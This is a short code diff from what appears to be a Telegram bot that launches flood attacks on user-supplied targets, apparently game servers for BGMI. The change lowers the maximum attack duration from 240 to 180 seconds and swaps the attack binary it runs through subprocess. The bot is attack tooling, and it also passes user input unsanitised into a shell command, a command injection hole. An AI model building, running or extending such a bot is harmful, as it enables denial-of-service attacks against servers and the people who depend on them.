@@ -72,8 +72,8 @@ def handle_bgmi(message):
             return
 
         target, port, duration = command[1], int(command[2]), int(command[3])
-        if duration > 240:
-            bot.reply_to(message, "𝐓𝐘𝐏𝐄 𝐒𝐄𝐂𝐎𝐍𝐃 --> 240")
+        if duration > 180:
+            bot.reply_to(message, "𝐓𝐘𝐏𝐄 𝐒𝐄𝐂𝐎𝐍𝐃 --> 180")
             return
 
         user_attack_count[user_id] = attacks_today + 1
@@ -89,7 +89,7 @@ def handle_bgmi(message):
 
         # Running the attack in a thread to avoid blocking the bot
         def execute_attack(user_id, target, port, duration):
-            process = subprocess.Popen(f"./BapuS4 {target} {port} {duration} 1000 ", shell=True)
+            process = subprocess.Popen(f"./S4OP {target} {port} {duration} 1000 ", shell=True)
             active_attacks[user_id] = process
 
             # Wait for the process to complete or for the duration to pass
